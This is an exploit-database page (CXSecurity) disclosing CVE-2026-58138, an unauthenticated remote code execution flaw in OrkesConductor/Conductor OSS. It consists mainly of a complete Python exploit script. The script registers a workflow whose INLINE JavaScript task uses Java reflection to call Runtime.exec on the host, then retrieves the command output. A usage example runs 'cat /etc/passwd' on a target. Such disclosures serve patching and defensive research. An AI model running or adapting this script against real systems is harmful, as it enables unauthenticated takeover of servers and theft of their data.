---
title: OrkesConductor 3.30.2 Unauthenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026080006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-12
fetch_date: 2026-08-13T04:02:48.110942
---

# OrkesConductor 3.30.2 Unauthenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OrkesConductor 3.30.2 Unauthenticated Remote Code Execution** **2026.08.12**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-58138](https://cxsecurity.com/cveshow/CVE-2026-58138/ "Click to see CVE-2026-58138")**  CWE: **N/A** | |

#!/usr/bin/env python3
# Exploit Title: OrkesConductor 3.30.2 - Unauthenticated Remote Code Execution
# CVE: CVE-2026-58138
# Date: 2026-07-10
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://orkes.io/
# Software Link: https://github.com/conductor-oss/conductor
# Affected: Orkes Conductor / Conductor OSS 3.21.21 < 3.30.2
# Tested on: conductoross/conductor:3.22.3
# Category: Remote Code Execution
# Platform: Linux
# Exploit Type: Unauthenticated RCE
# CVSS: 9.8
# Description: Unauthenticated remote code execution by submitting malicious INLINE JavaScript tasks that abuse unsandboxed GraalVM HostAccess.ALL for Java reflection and Runtime.exec.
# Fixed in: 3.30.2
# Usage:
# python3 exploit.py <target> [-c CMD]
#
# Examples:
# python3 exploit.py http://127.0.0.1:8080
# python3 exploit.py http://target:8080 -c "whoami; id; cat /etc/passwd"
#
# Options:
# target Conductor API base URL (e.g. http://127.0.0.1:8080)
# -c, --cmd Command to execute (default: id; hostname)
#
# Notes:
# • Requires no authentication (default community API behavior).
# • Runs as the Conductor process user (often root in Docker).
# • Pure Python stdlib - no extra dependencies.
import argparse
import json
import sys
import time
import urllib.request
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
def js\_rce(cmd):
c = cmd.replace("\\", "\\\\").replace("'", "\\'")
return (
"var k=$.getClass().getClass();"
"var S=k.getMethod('getName').getReturnType();"
"var forName=k.getMethod('forName',S);"
"var L=function(n){return forName.invoke(null,[n]);};"
"var RT=L('java.lang.Runtime');"
"var rt=RT.getMethod('getRuntime').invoke(null,[]);"
"var I=L('java.lang.Integer').getField('TYPE').get(null);"
"var A=L('java.lang.reflect.Array');"
"var arr=A.getMethod('newInstance',k,I).invoke(null,[S,3]);"
"var set=A.getMethod('set',L('java.lang.Object'),I,L('java.lang.Object'));"
f"set.invoke(null,[arr,0,'sh']);set.invoke(null,[arr,1,'-c']);set.invoke(null,[arr,2,'{c}']);"
"var p=RT.getMethod('exec',arr.getClass()).invoke(rt,[arr]);p.waitFor();"
"var isr=L('java.io.InputStreamReader').getConstructor(L('java.io.InputStream')).newInstance(p.getInputStream());"
"var br=L('java.io.BufferedReader').getConstructor(L('java.io.Reader')).newInstance(isr);"
"var o='',l;while((l=br.readLine())!==null)o+=l+'\\n';o"
)
def call(base, path, data=None, method=None):
url = base.rstrip("/") + path
body = json.dumps(data).encode() if data is not None else None
req = urllib.request.Request(
url,
data=body,
method=method or ("POST" if data is not None else "GET"),
headers={"Content-Type": "application/json", "Accept": "application/json,text/plain,\*/\*"}
)
with urllib.request.urlopen(req, timeout=30) as r:
raw = r.read().decode()
try:
return r.status, json.loads(raw)
except Exception:
return r.status, raw
def main():
banner()
ap = argparse.ArgumentParser(description="CVE-2026-58138 Conductor unauth RCE")
ap.add\_argument("target", help="Conductor API base, e.g. http://127.0.0.1:8080")
ap.add\_argument("-c", "--cmd", default="id; hostname", help="command to run on the Conductor host")
args = ap.parse\_args()
wf = "pwn\_" + str(int(time.time()))
wfdef = {
"name": wf,
"version": 1,
"schemaVersion": 2,
"ownerEmail": "poc@example.com",
"tasks": [{
"name": "pwn",
"taskReferenceName": "pwn",
"type": "INLINE",
"inputParameters": {"evaluatorType": "javascript", "expression": js\_rce(args.cmd)},
}],
}
print(f"[\*] Target: {args.target} cmd={args.cmd!r}")
print("[\*] Registering workflow with malicious INLINE task ... (no auth)")
call(args.target, "/api/metadata/workflow", wfdef)
st, wid = call(args.target, f"/api/workflow/{wf}", {})
wid = wid if isinstance(wid, str) else str(wid)
print(f"[\*] Started workflow id={wid}; fetching output ...")
time.sleep(2)
st, info = call(args.target, f"/api/workflow/{wid}?includeTasks=true")
out = None
for t in (info.get("tasks") or []):
if t.get("taskType") == "INLINE":
out = (t.get("outputData") or {}).get("result")
if out:
print("\n[+] RCE SUCCESS - Command output:")
print(str(out).strip())
else:
print("[!] No output captured. Workflow status:", info.get("status"))
if \_\_name\_\_ == "\_\_main\_\_":
sys.exit(main() or 0)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026080006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top